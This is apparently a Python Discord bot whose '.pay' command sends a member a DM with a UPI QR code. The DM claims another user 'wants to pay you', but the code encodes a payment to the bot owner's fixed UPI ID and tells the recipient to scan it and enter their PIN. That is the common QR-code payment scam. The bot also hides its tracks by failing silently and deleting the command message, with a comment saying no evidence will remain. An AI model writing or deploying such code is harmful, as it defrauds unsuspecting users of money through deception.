import discord
from discord.ext import commands
import qrcode
from io import BytesIO
import os
from dotenv import load_dotenv
import urllib.parse

load_dotenv()

# Bot configuration
intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix='.', intents=intents)

# Your fixed UPI ID
YOUR_UPI_ID = "dreamhelper@upi"
YOUR_NAME = "Dream Helper"  # अपना नाम डालें

@bot.event
async def on_ready():
    print(f'{bot.user} has connected to Discord!')
    print(f'Bot is in {len(bot.guilds)} guilds')
    print(f'Using UPI ID: {YOUR_UPI_ID}')

def create_upi_qr(amount, recipient_name):
    """Create UPI QR code with fixed UPI ID and amount"""
    
    # Encode the name for URL
    encoded_name = urllib.parse.quote(YOUR_NAME)
    
    # Create UPI payment URL with fixed amount
    upi_url = f"upi://pay?pa={YOUR_UPI_ID}&pn={encoded_name}&am={amount}&cu=INR"
    
    # Create QR code
    qr = qrcode.QRCode(
        version=1,
        box_size=10,
        border=4,
        error_correction=qrcode.constants.ERROR_CORRECT_H
    )
    
    qr.add_data(upi_url)
    qr.make(fit=True)
    
    # Create QR code image
    img = qr.make_image(fill_color="black", back_color="white")
    
    # Save to bytes
    img_bytes = BytesIO()
    img.save(img_bytes, format='PNG')
    img_bytes.seek(0)
    
    return img_bytes

@bot.command(name='pay')
async def pay(ctx, member: discord.Member = None, amount: int = None):
    """
    Send UPI QR code directly to user's DM
    Usage: .pay @username 100
    """
    
    # Validate inputs
    if member is None:
        return  # बिल्कुल silent, कोई response नहीं
    
    if amount is None:
        return  # बिल्कुल silent, कोई response नहीं
    
    if amount <= 0 or amount > 100000:
        return  # बिल्कुल silent, कोई response नहीं
    
    if member == ctx.author:
        return  # बिल्कुल silent, कोई response नहीं
    
    try:
        # Create UPI QR code with fixed amount
        qr_image = create_upi_qr(amount, str(member))
        
        # Create DM embed
        dm_embed = discord.Embed(
            title="💰 UPI Payment Request",
            description=f"{ctx.author.name} wants to pay you",
            color=discord.Color.green()
        )
        dm_embed.add_field(name="UPI ID", value=f"`{YOUR_UPI_ID}`", inline=True)
        dm_embed.add_field(name="Amount", value=f"**₹{amount}**", inline=True)
        dm_embed.add_field(name="From", value=ctx.author.name, inline=True)
        dm_embed.add_field(
            name="📱 How to Pay", 
            value="1. Scan QR code\n2. Open with any UPI app\n3. Amount is already set\n4. Enter PIN to pay", 
            inline=False
        )
        dm_embed.set_footer(text=f"Fixed Amount: ₹{amount}")
        
        # Send QR in DM to recipient
        file = discord.File(BytesIO(qr_image.getvalue()), filename="payment_qr.png")
        dm_embed.set_image(url="attachment://payment_qr.png")
        
        await member.send(file=file, embed=dm_embed)
        
        # Optional: सिर्फ आपको (पेयर) को DM में confirmation चाहिए?
        # अगर नहीं चाहिए तो ये हटा दें
        try:
            confirm_embed = discord.Embed(
                title="✅ Payment Request Sent",
                description=f"QR code sent to {member.name}",
                color=discord.Color.blue()
            )
            confirm_embed.add_field(name="Amount", value=f"₹{amount}", inline=True)
            confirm_embed.add_field(name="Recipient", value=member.name, inline=True)
            await ctx.author.send(embed=confirm_embed)
        except:
            pass  # अगर payer के DM बंद हैं तो ignore
            
    except discord.Forbidden:
        pass  # अगर recipient के DM बंद हैं तो silent ignore
    except Exception as e:
        print(f"Error: {e}")  # सिर्फ console में error log
        pass

@bot.command(name='payhelp')
async def pay_help(ctx):
    """Simple help command"""
    embed = discord.Embed(
        title="💰 UPI Payment Bot",
        description=f"Your UPI ID: `{YOUR_UPI_ID}`",
        color=discord.Color.gold()
    )
    embed.add_field(
        name="如何使用",
        value="`.pay @user 100`\nयूज़र के DM में QR code भेजेगा",
        inline=False
    )
    
    # सिर्फ DM में help भेजो, चैनल में नहीं
    await ctx.author.send(embed=embed)
    
    # अगर चाहो तो चैनल में कोई सबूत नहीं रहेगा
    try:
        await ctx.message.delete()  # कमांड मैसेज भी डिलीट कर दो
    except:
        pass

# Run the bot
if __name__ == "__main__":
    token = os.getenv('DISCORD_BOT_TOKEN')
    if not token:
        print("❌ Error: DISCORD_BOT_TOKEN not found in .env file!")
    else:
        print(f"✅ Bot starting with UPI ID: {YOUR_UPI_ID}")
        bot.run(token)